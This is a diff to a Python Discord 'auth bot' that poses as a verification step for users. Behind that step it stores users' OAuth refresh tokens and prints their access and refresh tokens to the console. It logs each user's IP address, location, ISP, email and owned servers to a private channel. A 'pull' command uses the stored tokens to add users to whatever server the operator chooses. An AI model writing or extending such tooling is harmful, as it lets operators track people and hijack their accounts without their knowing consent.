@@ -6,7 +6,6 @@ import aiohttp
 import json
 import os
 
-
 from quart import Quart, redirect, request, render_template
 from pystyle import Write, Colors
 
@@ -22,13 +21,10 @@ owners = config.get('owners', [])
 admins = config.get('admin_guilds', [])
 log_channel = config.get('log_channel', 0)
 
-quart_logging = config.get('quart_logging', True)
+quart_logging = config.get('server_logging', True)
 
 server_host = config.get('server_host', '0.0.0.0')
 server_port = config.get('server_port', 8000)
-
-target_guild = config.get('target_guild', 0)
-verified_role_id = config.get('verified_role_id', 0)
 
 if not quart_logging:
     logging.getLogger('hypercorn.access').disabled = True
@@ -121,17 +117,23 @@ async def update_data_file(user_id, refresh_token):
         return "new user"
     else:
         return "already authed"
-    
 
-async def pull(ctx, server_id):
+
+async def pull(ctx, server_id, amount=None):
     session = aiohttp.ClientSession()
     success = 0
     fail = 0
+    already_in_server = 0
+
+    total = 0
 
     with open('data.json', 'r') as f:
         data1 = json.load(f)
 
     keys = list(data1["users"].keys())
+
+    if amount is not None and amount > 0:
+        keys = keys[:amount]
 
     for refresh_token2 in keys:
         user_data = data1["users"][refresh_token2]
@@ -152,29 +154,51 @@ async def pull(ctx, server_id):
 
         url = f'https://discord.com/api/guilds/{server_id}/members/{user_id}'
         data = {
-            'access_token': f'{at}'
+            'access_token': at
         }
         headers = {
             "Authorization": f"Bot {token}",
             "Content-Type": "application/json"
         }
         try:
-            r = await session.put(url, json=data, headers=headers) 
-            if await r.json(content_type=None) is not None:
+            r = await session.put(url, json=data, headers=headers)
+            if r.status == 200 or r.status == 201:
                 success += 1
-            elif await r.json(content_type=None) is None:
+            elif r.status == 204:
+                already_in_server += 1
+            else:
                 fail += 1
-        except:
+        except Exception as e:
             fail += 1
             continue
         finally:
+            total += 1
             await asyncio.sleep(1)
 
-    if ctx is not None:
-        await ctx.respond(f"{ctx.author.mention} Pulling ended! Results:\n**Success: {success}**\n**Failed: {fail}**\n\n(fails happen because users deauthorize your app)", ephemeral=True)
+    if fail > success:
+        color = discord.Color.red()
+    else:
+        color = discord.Color.green()
+
+    embed = discord.Embed(title="Pull results", color=color)
+
+    embed.description = f"**Pull to `{bot.get_guild(int(server_id)).name}`**\n\n"
+    embed.description += f":ballot_box_with_check: **Already in server: `{already_in_server}`**\n"
+    embed.description += f":white_check_mark: **Success: `{success}`**\n"
+    embed.description += f":x: **Fail: `{fail}`**\n\n"
+    embed.description += f":information: **Total users pulled: `{total}`**"
+
+    embed.set_footer(text="kno's authbot")
+
+    await ctx.respond(
+        content=f"{ctx.author.mention} Pulling ended!",
+        embed=embed,
+        ephemeral=True
+    )
 
     await session.close()
     return {"status": "success"}
+
 
 
 class Bot(discord.Bot):
@@ -192,6 +216,7 @@ class Bot(discord.Bot):
 app = Quart(__name__)
 bot = Bot(intents=discord.Intents.all(), app=app)
 
+
 @app.route('/')
 async def index():
     code = request.args.get('code')
@@ -202,90 +227,95 @@ async def index():
     
     return redirect(f"{redirect_uri}/{state}?code={code}")
 
+
 @app.route('/<endpoint>')
 async def login(endpoint):
     session = aiohttp.ClientSession()
-    try:
-        code = request.args.get('code')
-        state = request.args.get('state')
-        if not code:
-            await session.close()
-            return await render_template('index.html')
-        
-        access_token = await get_token(code, redirect_uri, session)
-        refresh_token = access_token['refresh_token']
-        
-        user_data = await get_userdata(access_token['access_token'], session)
+    code = request.args.get('code')
+    state = endpoint
+    print(state)
 
-        user_json = user_data[0]
-        user_guilds = user_data[1]
 
-        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if not code:
         await session.close()
+        return await render_template('index.html')
+    
+    access_token = await get_token(code, redirect_uri, session)
+    refresh_token = access_token['refresh_token']
+    
+    user_data = await get_userdata(access_token['access_token'], session)
 
-        updater = await update_data_file(user_json['id'], refresh_token)
+    user_json = user_data[0]
+    user_guilds = user_data[1]
+
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    await session.close()
+
+    updater = await update_data_file(user_json['id'], refresh_token)
+    
+    user_id = user_json['id']
+    username = user_json['username']
+    avatar_hash = user_json['avatar']
+    global_name = user_json['global_name']
+    mfa = user_json['mfa_enabled']
+    locale = user_json['locale']
+
+    country, region, isp = get_ip_info(user_ip)
+
+    if avatar_hash is not None:
+        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.webp?size=1024"
+    else:
+        avatar_url = "https://discord.com/assets/02b73275048e30fd09ac.png"
+
+    embed = discord.Embed(title=":star: New authed user!", description=None)
+    embed.set_thumbnail(url=avatar_url)
+
+    embed.add_field(name=":bust_in_silhouette: User", value=f"{username if global_name is None else global_name} ({username})", inline=False)
+    embed.add_field(name=':mailbox_with_mail: Info', value=f"ID: **`{user_id}`**\nLocale: **{locale}**\nMFA: **{mfa}**", inline=False)
+    embed.add_field(name=":computer: Tech", value=f"IP: ```{user_ip}```", inline=False)
+    embed.add_field(name=":earth_asia: Location", value=f"Country: **{country}**\nRegion: **{region}**\nISP: **{isp}**", inline=False)
+
+    if user_json.get('email') is not None:
+        email = user_json['email']
+        is_verified = user_json['verified']
+
+        embed.set_field_at(1, name=":mailbox_with_mail: E-mail & Info", value=f"ID: **`{user_id}`**\nLocale: **{locale}**\nMFA: **{mfa}**\nEmail: **`{email}`**\nVerified: **{is_verified}**", inline=False)
+
+    if len(user_guilds) > 0:
+        owned_guilds = [guild for guild in user_guilds if guild['owner']]
+
+        owned_guilds_field_val = "```"
+
+        for guild in owned_guilds:
+            owned_guilds_field_val += f"- {guild['name']}\n"
+
+        owned_guilds_field_val += "```"
+        embed.add_field(name=":technologist: Servers I own", value=f"{owned_guilds_field_val}", inline=False)
+
+    embed.add_field(name=f":information: State", value=f"**{state}** ({bot.get_guild(int(state)).name if bot.get_guild(int(state)) is not None else 'Unknown guild'})")
+
+    if updater == "new user":
+        Write.Print(f"New user!\nID: {user_json['id']}\nAccess Token: {access_token['access_token']}\nRefresh Token: {refresh_token}\n", Colors.blue_to_cyan, interval=0)
         
-        user_id = user_json['id']
-        username = user_json['username']
-        avatar_hash = user_json['avatar']
-        global_name = user_json['global_name']
-        mfa = user_json['mfa_enabled']
-        locale = user_json['locale']
+        for guild in config['verify_guilds']:
+            if str(guild) == str(state):
+                verified_role_id = config['verify_guilds'].get(str(state))
 
-        country, region, isp = get_ip_info(user_ip)
+                guild = bot.get_guild(int(guild))
+                role = guild.get_role(int(verified_role_id))
 
-        if avatar_hash is not None:
-            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.webp?size=1024"
-        else:
-            avatar_url = "https://discord.com/assets/02b73275048e30fd09ac.png"
-
-        embed = discord.Embed(title=":star: New authed user!", description=None)
-        embed.set_thumbnail(url=avatar_url)
-
-        embed.add_field(name=":bust_in_silhouette: User", value=f"{username if global_name is None else global_name} ({username})", inline=False)
-        embed.add_field(name=':mailbox_with_mail: Info', value=f"ID: **`{user_id}`**\nLocale: **{locale}**\nMFA: **{mfa}**", inline=False)
-        embed.add_field(name=":computer: Tech", value=f"IP: ```{user_ip}```", inline=False)
-        embed.add_field(name=":earth_asia: Location", value=f"Country: **{country}**\nRegion: **{region}**\nISP: **{isp}**", inline=False)
-
-        if user_json.get('email') is not None:
-            email = user_json['email']
-            is_verified = user_json['verified']
-
-            embed.set_field_at(1, name=":mailbox_with_mail: E-mail & Info", value=f"ID: **`{user_id}`**\nLocale: **{locale}**\nMFA: **{mfa}**\nEmail: **`{email}`**\nVerified: **{is_verified}**", inline=False)
-
-        if len(user_guilds) > 0:
-            owned_guilds = [guild for guild in user_guilds if guild['owner']]
-
-            owned_guilds_field_val = "```"
-
-            for guild in owned_guilds:
-                owned_guilds_field_val += f"- {guild['name']}\n"
-
-            owned_guilds_field_val += "```"
-            embed.add_field(name=":technologist: Servers I own", value=f"{owned_guilds_field_val}", inline=False)
-
-        if updater == "new user":
-            Write.Print(f"New user!\nID: {user_json['id']}\nAccess Token: {access_token['access_token']}\nRefresh Token: {refresh_token}\n", Colors.blue_to_cyan, interval=0)
-            if int(target_guild) != 0:
-                guild = bot.get_guild(int(target_guild))
-                if int(verified_role_id) != 0:
-                    role = guild.get_role(int(verified_role_id))
-                    if role:
-                        member = guild.get_member(int(user_id))
-                        if member:
-                            await member.add_roles(role)
-                            embed.description = ":white_check_mark: Member was successfully verified."
-                        else:
-                            embed.description = ":x: Member not found."
+                if role:
+                    member = guild.get_member(int(user_id))
+                    if member:
+                        await member.add_roles(role)
+                        embed.description = ":white_check_mark: Member was successfully verified."
                     else:
-                        embed.description = ":x: Role not found."
-                    
-            await bot.get_channel(int(log_channel)).send(embed=embed)
-
-        return await render_template('index.html')
-    except Exception as e:
-        print(e)
-        return await render_template('index.html')
+                        embed.description = ":x: Member not found."
+                else:
+                    embed.description = ":x: Role not found."
+                
+        await bot.get_channel(int(log_channel)).send(embed=embed)
+    return await render_template('index.html')
 
 
 @bot.event
@@ -311,7 +341,7 @@ async def on_ready():
 
 
 @bot.slash_command(name="pull", description="Pull your members to desired server", guild_ids=admins)
-async def pull_command(ctx: discord.ApplicationContext, server_id: discord.Option(str, description="Server ID"), log_on_end: discord.Option(bool, description="Sends a message with success and fail count when the pull is ended if set to True", required=False)=False): # type: ignore
+async def pull_command(ctx: discord.ApplicationContext, server_id: discord.Option(str, description="Server ID"), amount: discord.Option(int, description="Amount of members to pull, defaults to all your members", required=False)=None): # type: ignore
     if ctx.author.id not in owners:
         return
 
@@ -321,11 +351,8 @@ async def pull_command(ctx: discord.ApplicationContext, server_id: discord.Optio
         return
         
 
-    await ctx.respond(f"Pulling started! Server: {guild.name}", ephemeral=True)
-    await pull(ctx if log_on_end else None, server_id)
-
-    if not log_on_end:
-        await ctx.respond(f"{ctx.author.mention} Pulling ended!", ephemeral=True)
+    await ctx.respond(f"Pulling started! Server: `{guild.name}`", ephemeral=True)
+    await pull(ctx, server_id, amount)
 
 
 @bot.slash_command(name="getdata", description="Get all member data", guild_ids=admins)
@@ -357,7 +384,7 @@ async def uploaddata(ctx: discord.ApplicationContext, file: discord.Option(disco
 
         await msg.edit_original_response(content=f"Data successfully loaded! Total users: **{total_users}**\nWarning: If you uploaded users from another app, they will not be valid!")
     except Exception as e:
-        await ctx.respond(f"An error occurred while uploading the file: {e}", ephemeral=True)
+        await ctx.respond(f"An error occurred while uploading the file: `{e}`", ephemeral=True)
 
 
 @bot.slash_command(name="usercount", description="Get your verified users count", guild_ids=admins)
@@ -390,13 +417,15 @@ async def verify_embed(ctx: discord.ApplicationContext,
     if thumbnail is not None:
         embed.set_thumbnail(url=thumbnail)
 
-    view = discord.ui.View()
-    view.add_item(discord.ui.Button(label=button_text, url=LOGIN_URL, emoji=bot.get_emoji(int(button_emoji)) if button_emoji is not None else None))
 
     channel = bot.get_channel(int(channel_id))
     if channel is None:
-        await ctx.respond("Channel not found!", ephemeral=True)
-        return
+        return await ctx.respond("Channel not found!", ephemeral=True)
+    
+    login_url_with_state = LOGIN_URL + f"&state={channel.guild.id}"
+
+    view = discord.ui.View()
+    view.add_item(discord.ui.Button(label=button_text, url=login_url_with_state, emoji=bot.get_emoji(int(button_emoji)) if button_emoji is not None else None))
     
     await channel.send(embed=embed, view=view)
     await ctx.respond(":white_check_mark:", ephemeral=True)
